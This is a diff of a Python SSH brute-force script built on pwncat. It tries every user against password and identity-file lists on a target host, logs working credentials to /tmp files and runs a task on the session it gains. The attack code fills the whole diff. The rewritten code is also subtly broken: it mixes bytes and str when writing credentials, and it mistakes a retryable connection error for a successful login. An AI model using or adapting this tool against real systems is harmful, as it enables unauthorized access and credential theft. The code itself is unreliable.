@@ -157,6 +157,90 @@ done'''.encode("utf-8"))
         session_lock.unlink()
 
 
+def attempt_ssh_connection(user, credential, credential_type, target_ip, target_port, task):
+    """
+    Attempt to establish an SSH connection using either a password or an identity file.
+
+    Args:
+        user (str): The username for the SSH connection.
+        credential (str): The password or the path to the identity file.
+        credential_type (str): 'password' or 'identity' to indicate the credential type.
+        target_ip (str): The target IP address for the SSH connection.
+        target_port (int): The target port number for the SSH connection.
+        task (str): The task to execute upon successful connection.
+
+    Returns:
+        bool: True if the connection was successful, False otherwise.
+    """
+    with pwncat.manager.Manager() as manager:
+        # Load modules and set configuration
+        manager.load_modules(str(Path.cwd() / "plugins"))
+        manager.config.set("verbose", True, glob=True)
+
+        try:
+            # Establish a pwncat session
+            session_args = {
+                "platform": "linux",  # Use colon for correct syntax
+                "host": target_ip,
+                "port": target_port,
+                "user": user
+            }
+            if credential_type == 'password':
+                session_args["password"] = credential
+            elif credential_type == 'identity':
+                session_args["identity"] = credential
+
+            session = manager.create_session(**session_args)
+
+            # Correct file writing with encoding
+            with open('/tmp/found-users.txt', 'ab+') as f:
+                f.write(user.encode() + b'\n')  # Ensure bytes are written
+            if credential_type == 'password':
+                with open('/tmp/found-passwords.txt', 'ab+') as f:
+                    f.write(credential.encode() + b'\n')
+                with open('/tmp/found-user-passwords.txt', 'ab+') as f:
+                    f.write(user.encode() + ":" + credential.encode() + b'\n')
+            elif credential_type == 'identity':
+                with open('/tmp/found-identities.txt', 'ab+') as f:
+                    f.write(credential.encode() + b'\n')
+                with open('/tmp/found-user-identities.txt', 'ab+') as f:
+                    f.write(user.encode() + ":" + credential.encode() + b'\n')
+
+            execute(session, task)  # Execute the specified task
+            return True, session  # Return True if connection and task execution were successful
+        except ChannelError as e:
+            # Custom function to handle different ChannelError cases
+            retry = is_retryable_error(e)
+            return retry, None
+
+
+def is_retryable_error(error):
+    """
+    Determine if the ChannelError encountered during the SSH connection attempt is retryable.
+
+    Args:
+        error (ChannelError): The exception encountered during the SSH connection attempt.
+
+    Returns:
+        bool: True if the error is retryable, False otherwise.
+    """
+    if error.args[0] in [
+        'ssh authentication failed: Authentication failed.',
+        'ssh connection failed: No authentication methods available',
+        'ssh connection failed: Error reading SSH protocol banner[Errno 104] Connection reset by peer'
+    ]:
+        print("Authentication failed: Bad password or user name.")
+        # return false to indicte we should not retry
+        return False
+    elif error.args[0] == 'ssh connection failed: Error reading SSH protocol banner':
+        # return try to indicate that we should retry on connection failed
+        print("SSH connection failed - retry required.")
+        return True
+    else:
+        # Handle other types of errors or re-raise the exception
+        raise error
+
+
 # add interrupt handler for cleanup of lock file
 signal.signal(signal.SIGINT, signal_handler)
 
@@ -195,7 +279,9 @@ if not len(passwords) and not len(identities):
 # reset found users
 Path("/tmp/found-users.txt").unlink(True)
 Path("/tmp/found-passwords.txt").unlink(True)
+Path("/tmp/found-user-passwords.txt").unlink(True)
 Path("/tmp/found-identities.txt").unlink(True)
+Path("/tmp/found-user-identities.txt").unlink(True)
 
 # append default passwords as required
 if args.add_default_passwords:
@@ -211,175 +297,36 @@ if args.add_default_users:
 
 # enumerate users
 success = False
-for user in users:
-    # enumerate passwords
-    for password in passwords:
-        # ssh password connection
-        try:
-            with pwncat.manager.Manager() as manager:
-                # Establish a pwncat session
-                manager.load_modules(str(Path.joinpath(
-                    Path.cwd(), Path("plugins"))))
-                manager.config.set("verbose", True, glob=True)
-                print(
-                    f"SSH password login attempt: {user}:{password}@{args.target_ip}:{args.target_port}")
-                session = manager.create_session(
-                    "linux",
-                    host=args.target_ip,
-                    port=args.target_port,
-                    user=user,
-                    password=password,
-                )
-                with open('/tmp/found-users.txt', 'ab+') as f:
-                    f.write(user)
-                with open('/tmp/found-passwords.txt', 'ab+') as f:
-                    f.write(password)
-                execute(session, args.task)
-                success = True
-        except ChannelError as e:
-            if e.args[0] in [
-                'ssh authentication failed: Authentication failed.',
-                'ssh connection failed: No authentication methods available',
-                'ssh connection failed: Error reading SSH protocol banner[Errno 104] Connection reset by peer'
-            ]:
-                print("Authentication failed: Bad password or user name.")
-                time.sleep(1.5)
-            elif e.args[0] in [
-                'ssh connection failed: Error reading SSH protocol banner'
-            ]:
-                reconnect = True
-                wait_loop = 1
-                while reconnect:
-                    sleep_time = 30*wait_loop
+max_retries = 3  # Maximum retry attempts
+
+for credential_type in ["password", "identity"]:
+    for user in users:
+        credentials = passwords if credential_type == 'password' else identities
+        for credential in credentials:
+            retries = 0  # Retry counter
+            while retries < max_retries:
+                success, session = attempt_ssh_connection(
+                    user, credential, credential_type, args.target_ip, args.target_port, args.task)
+                if success:
                     print(
-                        f"Connection rejected - sleeping {sleep_time} seconds before retry")
-                    time.sleep(sleep_time)
-                    try:
-                        with pwncat.manager.Manager() as manager:
-                            # Establish a pwncat session
-                            manager.load_modules(str(Path.joinpath(
-                                Path.cwd(), Path("plugins"))))
-                            manager.config.set("verbose", True, glob=True)
-                            print(
-                                f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
-                            session = manager.create_session(
-                                "linux",
-                                host=args.target_ip,
-                                port=args.target_port,
-                                user=user,
-                                password=password,
-                            )
-                            with open('/tmp/found-users.txt', 'ab+') as f:
-                                f.write(user)
-                            with open('/tmp/found-passwords.txt', 'ab+') as f:
-                                f.write(password)
-                            execute(session, args.task)
-                            success = True
-                            reconnect = False
-                    except ChannelError as e:
-                        if e.args[0] in [
-                            'ssh connection failed: Error reading SSH protocol banner'
-                        ]:
-                            print(f"Connection error: {e.args[0]}")
-                            wait_loop += 1
-                        else:
-                            print(
-                                "Authentication failed: Bad password or user name.")
-                            time.sleep(1.5)
-                            reconnect = False
-
-            else:
-                raise e
-
-        # stop password enumeration
+                        f"Successful {credential_type} authentication: {user} with {credential}")
+                    break  # Exit the credential loop if a successful connection was made
+                else:
+                    retries += 1
+                    print(f"Attempt {retries} failed for {user}.")
+                    if retries < max_retries:
+                        print(f"Retrying... ({retries}/{max_retries})")
+                        # Sleep to avoid immediate reconnection
+                        time.sleep(retries*30)
+                    else:
+                        print(
+                            f"Maximum retries reached for {user} with {credential_type}.")
+            if success:
+                break  # Exit the credential loop if a successful connection was made
         if success:
-            break
-
-    # enumerate identities
-    for identity in identities:
-        # ssh identity connection
-        try:
-            with pwncat.manager.Manager() as manager:
-                # Establish a pwncat session
-                manager.load_modules(str(Path.joinpath(
-                    Path.cwd(), Path("plugins"))))
-                manager.config.set("verbose", True, glob=True)
-                print(
-                    f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
-                session = manager.create_session(
-                    "linux",
-                    host=args.target_ip,
-                    port=args.target_port,
-                    user=user,
-                    identity=identity,
-                )
-                with open('/tmp/found-users.txt', 'ab+') as f:
-                    f.write(user)
-                with open('/tmp/found-identities.txt', 'ab+') as f:
-                    f.write(identity)
-                execute(session, args.task)
-                success = True
-        except ChannelError as e:
-            if e.args[0] in [
-                'ssh authentication failed: Authentication failed.',
-                'ssh connection failed: No authentication methods available',
-                'ssh connection failed: Error reading SSH protocol banner[Errno 104] Connection reset by peer'
-            ]:
-                print("Authentication failed: Bad password or user name.")
-                time.sleep(1.5)
-            elif e.args[0] in [
-                'ssh connection failed: Error reading SSH protocol banner'
-            ]:
-                reconnect = True
-                wait_loop = 1
-                while reconnect:
-                    sleep_time = 30*wait_loop
-                    print(
-                        f"Connection rejected - sleeping {sleep_time} seconds before retry")
-                    time.sleep(sleep_time)
-                    try:
-                        with pwncat.manager.Manager() as manager:
-                            # Establish a pwncat session
-                            manager.load_modules(str(Path.joinpath(
-                                Path.cwd(), Path("plugins"))))
-                            manager.config.set("verbose", True, glob=True)
-                            print(
-                                f"SSH identity login attempt: {user}@{args.target_ip}:{args.target_port}")
-                            session = manager.create_session(
-                                "linux",
-                                host=args.target_ip,
-                                port=args.target_port,
-                                user=user,
-                                identity=identity,
-                            )
-                            with open('/tmp/found-users.txt', 'ab+') as f:
-                                f.write(user)
-                            with open('/tmp/found-identities.txt', 'ab+') as f:
-                                f.write(identity)
-                            execute(session, args.task)
-                            success = True
-                            reconnect = False
-                    except ChannelError as e:
-                        if e.args[0] in [
-                            'ssh connection failed: Error reading SSH protocol banner'
-                        ]:
-                            print(f"Connection error: {e.args[0]}")
-                            wait_loop += 1
-                        else:
-                            print(
-                                "Authentication failed: Bad password or user name.")
-                            time.sleep(1.5)
-                            reconnect = False
-            else:
-                raise e
-
-        # stop identity enumeration
-        if success:
-            break
-
-    # stop user enumeration
+            break  # Exit the user loop if a successful connection was made
     if success:
-        break
+        break  # Exit the credential_type loop if a successful connection was made
 
 exit(0)
 
